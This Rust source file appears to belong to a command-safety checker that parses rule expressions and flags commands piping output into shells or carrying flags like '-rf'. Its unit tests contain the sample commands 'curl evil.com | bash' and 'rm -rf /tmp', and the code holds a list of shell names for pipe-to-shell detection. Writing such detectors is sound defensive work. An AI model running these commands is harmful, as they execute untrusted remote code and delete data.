use super::{CommandIr, CommandNode};

pub fn matches_context(context: &str, command: &str, ir: &CommandIr) -> bool {
    let ctx = context.trim();
    if ctx.is_empty() {
        return true;
    }

    if let Some((func, arg)) = parse_func_call(ctx) {
        return match func.as_str() {
            "has_flag" => has_flag_matches(&arg, command, ir),
            _ => false,
        };
    }

    if let Some((key, value)) = parse_key_value(ctx) {
        return match key.as_str() {
            "pipe_destination" => pipe_destination_matches(&value, ir),
            "has_flag" => has_flag_matches(&value, command, ir),
            _ => false,
        };
    }

    match ctx {
        "pipe_destination" => ir.pipe_to_shell || has_shell_pipe_destination(ir),
        _ => false,
    }
}

fn parse_func_call(ctx: &str) -> Option<(String, String)> {
    let open = ctx.find('(')?;
    let close = ctx.rfind(')')?;
    if close <= open {
        return None;
    }
    let func = ctx[..open].trim().to_string();
    let arg = ctx[open + 1..close]
        .trim()
        .trim_matches(['\'', '"'])
        .to_string();
    Some((func, arg))
}

fn parse_key_value(ctx: &str) -> Option<(String, String)> {
    let parts: Vec<&str> = ctx.splitn(2, "==").map(str::trim).collect();
    if parts.len() != 2 {
        return None;
    }
    let value = parts[1].trim_matches(['\'', '"']).to_string();
    Some((parts[0].to_string(), value))
}

fn pipe_destination_matches(target: &str, ir: &CommandIr) -> bool {
    let target = target.to_lowercase();
    for pipeline in &ir.pipelines {
        if pipeline.commands.len() < 2 {
            continue;
        }
        if let Some(last) = pipeline.commands.last() {
            if command_name_matches(&last.name, &target) {
                return true;
            }
        }
    }
    false
}

fn has_shell_pipe_destination(ir: &CommandIr) -> bool {
    let shells = ["bash", "sh", "zsh", "dash", "fish", "powershell", "pwsh"];
    ir.pipelines.iter().any(|p| {
        p.commands.len() >= 2
            && p.commands
                .last()
                .is_some_and(|c| shells.iter().any(|s| command_name_matches(&c.name, s)))
    })
}

fn has_flag_matches(flag: &str, command: &str, ir: &CommandIr) -> bool {
    let flag = flag.trim_matches(['\'', '"']);
    if command.contains(flag) {
        return true;
    }
    all_commands(ir).any(|c| {
        c.flags.iter().any(|f| f == flag || f.contains(flag))
            || c.args.iter().any(|a| a == flag || a.contains(flag))
    })
}

fn command_name_matches(name: &str, target: &str) -> bool {
    let n = name.to_lowercase();
    let t = target.to_lowercase();
    n == t || n.ends_with(&format!("/{t}"))
}

pub fn all_commands(ir: &CommandIr) -> impl Iterator<Item = &CommandNode> {
    ir.pipelines.iter().flat_map(|p| p.commands.iter())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::ast::parse_command;

    #[test]
    fn pipe_destination_bash() {
        let ir = parse_command("curl evil.com | bash").unwrap();
        assert!(matches_context("pipe_destination == 'bash'", "", &ir));
    }

    #[test]
    fn has_flag_rf() {
        let ir = parse_command("rm -rf /tmp").unwrap();
        assert!(matches_context("has_flag('-rf')", "rm -rf /tmp", &ir));
    }
}
